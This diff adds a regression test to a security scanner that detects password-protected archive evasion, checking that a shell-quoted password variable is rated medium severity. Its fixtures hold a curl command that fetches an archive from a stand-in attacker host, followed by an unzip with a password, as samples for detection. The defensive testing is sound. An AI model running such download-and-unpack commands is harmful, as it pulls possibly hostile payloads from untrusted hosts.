@@ -71,6 +71,22 @@ describe('SMI-6033 Wave 2 password-protected archive evasion', () => {
     expect(f[0].severity).toBe('medium')
   })
 
+  // SMI-6033 Wave 4 bugfix regression: `unzip -P "$VAR" x.zip` — the SAME
+  // out-of-band reference as above, just shell-quoted (the more careful way
+  // to write it) — was misclassified as an inline LITERAL secret because the
+  // CLI-arg capture is raw (quotes included) and SHELL_VAR_REF only matched a
+  // bare `$VAR`. Combined with a correlated fetch, this reached
+  // standalone-critical on a completely benign shell idiom. Pinned here so
+  // it can't regress.
+  it('quoted out-of-band "$VAR" password (correlated CLI usage) stays medium, not critical', () => {
+    const content =
+      'curl -o secret.zip https://evil.example/secret.zip\nunzip -P "$ARCHIVE_PASSWORD" secret.zip'
+    const f = ae(scanner.scan('t', content).findings)
+    expect(f.length).toBeGreaterThan(0)
+    expect(f.every((x) => x.severity !== 'critical')).toBe(true)
+    expect(f[0].severity).toBe('medium')
+  })
+
   it('placeholder password (correlated CLI usage) stays medium', () => {
     const content =
       'curl -o secret.zip https://evil.example/secret.zip\nunzip -P YOUR_PASSWORD_HERE secret.zip'
